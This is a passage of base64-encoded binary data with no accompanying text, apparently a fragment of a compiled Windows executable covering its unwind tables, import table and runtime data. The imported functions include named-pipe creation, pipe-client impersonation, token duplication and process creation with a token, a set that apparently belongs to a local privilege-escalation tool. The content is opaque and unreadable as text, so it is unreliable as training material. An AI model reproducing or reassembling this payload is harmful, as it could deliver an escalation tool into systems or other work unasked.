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lwZVcAAOYFV2FpdEZvclNpbmdsZU9iamVjdAAhAkdldEN1cnJlbnRUaHJlYWQAAIYAQ2xvc2VIYW5kbGUA8gBDcmVhdGVUaHJlYWQAAJwAQ29ubmVjdE5hbWVkUGlwZQAAHQJHZXRDdXJyZW50UHJvY2VzcwC1AkdldFByb2NBZGRyZXNzAABLRVJORUwzMi5kbGwAAGoDU2V0VXNlck9iamVjdFNlY3VyaXR5ANgBR2V0VXNlck9iamVjdFNlY3VyaXR5AKICT3BlbldpbmRvd1N0YXRpb25XAACtAUdldFByb2Nlc3NXaW5kb3dTdGF0aW9uAJ0CT3BlbkRlc2t0b3BXAADlA3dzcHJpbnRmVwDXAUdldFVzZXJPYmplY3RJbmZvcm1hdGlvblcAUgNTZXRQcm9jZXNzV2luZG93U3RhdGlvbgBQAENsb3NlRGVza3RvcAAAVABDbG9zZVdpbmRvd1N0YXRpb24AAFVTRVIzMi5kbGwAABAAQWRkQWNjZXNzQWxsb3dlZEFjZQBLAUdldExlbmd0aFNpZAAAjgFJbml0aWFsaXplQWNsAI8BSW5pdGlhbGl6ZVNlY3VyaXR5RGVzY3JpcHRvcgAAFgBBZGRBY2UAAIUAQ29weVNpZAAgAEFsbG9jYXRlQW5kSW5pdGlhbGl6ZVNpZAAANwFHZXRBY2UAADgBR2V0QWNsSW5mb3JtYXRpb24AXQFHZXRTZWN1cml0eURlc2NyaXB0b3JEYWNsAOgCU2V0U2VjdXJpdHlEZXNjcmlwdG9yRGFjbAAaAk9wZW5UaHJlYWRUb2tlbgDxAER1cGxpY2F0ZVRva2VuRXgAAIEAQ29udmVydFN0cmluZ1NlY3VyaXR5RGVzY3JpcHRvclRvU2VjdXJpdHlEZXNjcmlwdG9yVwAAjAFJbXBlcnNvbmF0ZU5hbWVkUGlwZUNsaWVudAAAjQBDcmVhdGVQcm9jZXNzV2l0aFRva2VuVwDBAlJldmVydFRvU2VsZgAAFQJPcGVuUHJvY2Vzc1Rva2VuAAAfAEFkanVzdFRva2VuUHJpdmlsZWdlcwCvAUxvb2t1cFByaXZpbGVnZVZhbHVlVwBBRFZBUEkzMi5kbGwAAOsCUnRsQ2FwdHVyZUNvbnRleHQA0wRSdGxMb29rdXBGdW5jdGlvbkVudHJ5AAD8BVJ0bFZpcnR1YWxVbndpbmQAAG50ZGxsLmRsbAC8BVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAewVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAmgVUZXJtaW5hdGVQcm9jZXNzAACJA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAUARRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAeAkdldEN1cnJlbnRQcm9jZXNzSWQAIgJHZXRDdXJyZW50VGhyZWFkSWQAAPACR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAbANJbml0aWFsaXplU0xpc3RIZWFkAIIDSXNEZWJ1Z2dlclByZXNlbnQA1wJHZXRTdGFydHVwSW5mb1cAfgJHZXRNb2R1bGVIYW5kbGVXAADgBFJ0bFVud2luZEV4AD8FU2V0TGFzdEVycm9yAAA1AUVudGVyQ3JpdGljYWxTZWN0aW9uAADAA0xlYXZlQ3JpdGljYWxTZWN0aW9uAAARAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgBoA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQArAVUbHNBbGxvYwAArgVUbHNHZXRWYWx1ZQCvBVRsc1NldFZhbHVlAK0FVGxzRnJlZQCxAUZyZWVMaWJyYXJ5AMYDTG9hZExpYnJhcnlFeFcAADEBRW5jb2RlUG9pbnRlcgBmBFJhaXNlRXhjZXB0aW9uAADcBFJ0bFBjVG9GaWxlSGVhZGVyAGQBRXhpdFByb2Nlc3MAfQJHZXRNb2R1bGVIYW5kbGVFeFcAANkCR2V0U3RkSGFuZGxlAAAhBldyaXRlRmlsZQB6AkdldE1vZHVsZUZpbGVOYW1lVwAA3AFHZXRDb21tYW5kTGluZUEA3QFHZXRDb21tYW5kTGluZVcAmwBDb21wYXJlU3RyaW5nVwAAtANMQ01hcFN0cmluZ1cAAFUCR2V0RmlsZVR5cGUADQZXaWRlQ2hhclRvTXVsdGlCeXRlAHsBRmluZENsb3NlAIEBRmluZEZpcnN0RmlsZUV4VwAAkgFGaW5kTmV4dEZpbGVXAI4DSXNWYWxpZENvZGVQYWdlALgBR2V0QUNQAACeAkdldE9FTUNQAADHAUdldENQSW5mbwDyA011bHRpQnl0ZVRvV2lkZUNoYXIAPgJHZX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